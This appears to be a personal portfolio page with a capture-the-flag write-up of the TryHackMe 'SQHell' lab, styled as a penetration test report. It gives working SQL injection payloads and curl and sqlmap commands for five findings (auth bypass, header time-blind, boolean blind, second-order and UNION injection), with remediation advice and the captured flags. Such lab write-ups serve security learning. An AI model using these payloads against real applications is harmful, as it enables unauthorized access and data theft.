@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A penetration test was conducted against the SQHell web application (10.65.137.112). The application runs on Ubuntu Linux with nginx 1.18.0 and exposes SSH (por">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="SQHell — Penetration Test Disclosure Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>SQHell — Penetration Test Disclosure Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">SQHell — Penetration Test Disclosure Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-medium">Medium</span> <span class="dot">·</span> <span class="date">2026-07-08</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> 10.65.137.112 <strong>Assessment Date:</strong> 2026-07-08 <strong>Classification:</strong> CONFIDENTIAL</p>
+<hr>
+<h2>1. Executive Summary</h2>
+<p>A penetration test was conducted against the SQHell web application (10.65.137.112). The application runs on Ubuntu Linux with nginx 1.18.0 and exposes SSH (port 22) and HTTP (port 80). Five distinct SQL injection vulnerabilities were identified and exploited across four different endpoints and one HTTP header, each accessing separate backend databases (<code>sqhell_1</code> through <code>sqhell_5</code>). All five flags were recovered, demonstrating authentication bypass, data extraction via UNION queries, boolean-based blind injection, time-based blind injection via the <code>X-Forwarded-For</code> header, and a second-order SQL injection.</p>
+<hr>
+<h2>2. Scope</h2>
+<table>
+<thead><tr>
+<th>Element</th>
+<th>Detail</th>
+</tr></thead><tbody>
+<tr>
+<td>Target</td>
+<td>10.65.137.112</td>
+</tr>
+<tr>
+<td>Ports in Scope</td>
+<td>22 (SSH), 80 (HTTP)</td>
+</tr>
+<tr>
+<td>Applications</td>
+<td>SQHell blog application (nginx 1.18.0, PHP, MySQL 8)</td>
+</tr>
+<tr>
+<td>Assessment Type</td>
+<td>External penetration test</td>
+</tr>
+<tr>
+<td>Environment</td>
+<td>Linux (Ubuntu), kernel via OpenSSH 8.2p1</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>3. Attack Chain</h2>
+<pre><code>Web app recon → /login SQLi (auth bypass) → Flag 1
+              → /register/user-check blind SQLi → Flag 3
+              → /post UNION SQLi → Flag 5
+              → /user X-Forwarded-For header time-blind SQLi → Flag 2
+              → /user second-order UNION SQLi → Flag 4</code></pre>
+<hr>
+<h2>4. Findings Summary</h2>
+<table>
+<thead><tr>
+<th>ID</th>
+<th>Finding</th>
+<th>CVSSv3</th>
+<th>Risk</th>
+</tr></thead><tbody>
+<tr>
+<td>F-01</td>
+<td>SQL Injection in Login Form (Auth Bypass)</td>
+<td>9.8</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-02</td>
+<td>SQL Injection in X-Forwarded-For Header</td>
+<td>9.1</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-03</td>
+<td>Blind SQL Injection in Username Check Endpoint</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-04</td>
+<td>Second-Order SQL Injection in User Profile</td>
+<td>8.6</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-05</td>
+<td>UNION-Based SQL Injection in Blog Post Parameter</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>5. Detailed Findings</h2>
+<h3>F-01: SQL Injection in Login Form (Auth Bypass)</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.8) <strong>Affected Component:</strong> <code>POST /login</code>, <code>username</code> parameter</p>
+<p><strong>Description:</strong> The login form accepts unsanitized user input directly in SQL queries. Supplying the payload <code>admin&#x27; OR 1=1-- </code> in the username field bypasses authentication entirely and displays Flag 1.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -s &quot;http://10.65.137.112/login&quot; -d &quot;username=admin&#x27; OR 1=1-- &amp;password=test&quot;</code></pre>
+<p><strong>Impact:</strong> An attacker can bypass authentication without valid credentials, gaining access to restricted application areas.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — network-exploitable, no privileges required, no user interaction, full compromise.</p>
+<hr>
+<h3>F-02: SQL Injection in X-Forwarded-For Header</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.1) <strong>Affected Component:</strong> <code>GET /user?id=1</code>, <code>X-Forwarded-For</code> HTTP header</p>
+<p><strong>Description:</strong> The application logs visitor IP addresses via the <code>X-Forwarded-For</code> header without sanitization, inserting it directly into a SQL query against the <code>sqhell_1</code> database. Time-based blind injection extracts Flag 2.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>sqlmap -u &quot;http://10.65.137.112/user?id=1&quot; --headers=&quot;X-Forwarded-For: 1*&quot; --level 5 --risk 3 -D sqhell_1 -T flag --dump --time-sec 1</code></pre>
+<p><strong>Impact:</strong> An attacker can extract the full contents of the <code>sqhell_1</code> database, including the flag table.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — no privileges required, full database read with potential write via stacked queries.</p>
+<hr>
+<h3>F-03: Blind SQL Injection in Username Check Endpoint</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> <code>GET /register/user-check?username=</code></p>
+<p><strong>Description:</strong> The AJAX username availability check endpoint is vulnerable to boolean-based blind SQL injection against the <code>sqhell_3</code> database. The response <code>{&quot;available&quot;:true/false}</code> serves as an oracle.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># True condition:
+curl &quot;http://10.65.137.112/register/user-check?username=&#x27; OR 1=1-- &quot;
+# Returns: {&quot;available&quot;:false}
+
+# False condition:
+curl &quot;http://10.65.137.112/register/user-check?username=&#x27; OR 1=2-- &quot;
+# Returns: {&quot;available&quot;:true}</code></pre>
+<p><strong>Impact:</strong> Blind extraction of all database contents, including the flag table.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — full read access, no write or denial-of-service.</p>
+<hr>
+<h3>F-04: Second-Order SQL Injection in User Profile</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.6) <strong>Affected Component:</strong> <code>GET /user?id=</code></p>
+<p><strong>Description:</strong> The user profile endpoint returns user data via a first SQL query against <code>sqhell_4</code>. The <code>id</code> column from the first query's result is then unsanitized in a second query against <code>sqhell_5</code> to fetch the user's posts. A crafted UNION payload in the first query injects into the second query.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -s &quot;http://10.65.137.112/user?id=0 UNION SELECT &#x27;1 UNION SELECT flag,flag,flag,flag FROM flag-- -&#x27;,2,3 FROM users-- -&quot;
+# Flag 4 appears in the post links on the page.</code></pre>
+<p><strong>Impact:</strong> An attacker can execute arbitrary SQL in the second query context (<code>sqhell_5</code>), extracting the flag table.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — full database read/write in the second query context.</p>
+<hr>
+<h3>F-05: UNION-Based SQL Injection in Blog Post Parameter</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> <code>GET /post?id=</code></p>
+<p><strong>Description:</strong> The blog post viewer takes an <code>id</code> parameter directly into a SQL query without sanitization. A UNION SELECT with 4 columns extracts data from the <code>sqhell_5.flag</code> table.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -s &quot;http://10.65.137.112/post?id=0 UNION SELECT 1,group_concat(flag),3,4 FROM flag&quot;</code></pre>
+<p><strong>Impact:</strong> Direct extraction of the flag table contents.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — read-only, no authentication required.</p>
+<hr>
+<h2>6. Remediation Recommendations</h2>
+<ol>
+<li><strong>F-01, F-05:</strong> Use parameterized queries (prepared statements) for all database interactions.</li>
+<li><strong>F-02:</strong> Sanitize all HTTP header values before database insertion; prefer parameterized queries for logged data.</li>
+<li><strong>F-03:</strong> Replace string concatenation in SQL with prepared statements in the username-check handler.</li>
+<li><strong>F-04:</strong> Ensure results from a first query are cast to expected types (e.g., <code>intval()</code>) before use in subsequent queries.</li>
+<li><strong>F-01 through F-05:</strong> Apply strict input validation (allow-lists for numeric IDs, length limits for strings).</li>
+<li><strong>All:</strong> Implement a Web Application Firewall (WAF) as a defense-in-depth layer.</li>
+<li><strong>All:</strong> Grant least-privilege database permissions — each application function should only access its required tables.</li>
+</ol>
+<hr>
+<h2>7. Flags Obtained</h2>
+<ul>
+<li><strong>Flag 1:</strong> <code>THM{FLAG1:E786483E5A53075750F1FA792E823BD2}</code></li>
+<li><strong>Flag 2:</strong> <code>THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}</code></li>
+<li><strong>Flag 3:</strong> <code>THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}</code></li>
+<li><strong>Flag 4:</strong> <code>THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}</code></li>
+<li><strong>Flag 5:</strong> <code>THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}</code></li>
+</ul>
+<hr>
+<h2>8. Cleanup</h2>
+<ul>
+<li>[x] All temporary files removed from target (no shells uploaded)</li>
+<li>[x] No reverse shells left running</li>
+<li>[x] Credentials stored in local <code>creds.txt</code> only</li>
+<li>[x] Artifacts remain only in <code>~/Documents/THM/Challenges/SQHell/</code></li>
+</ul>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
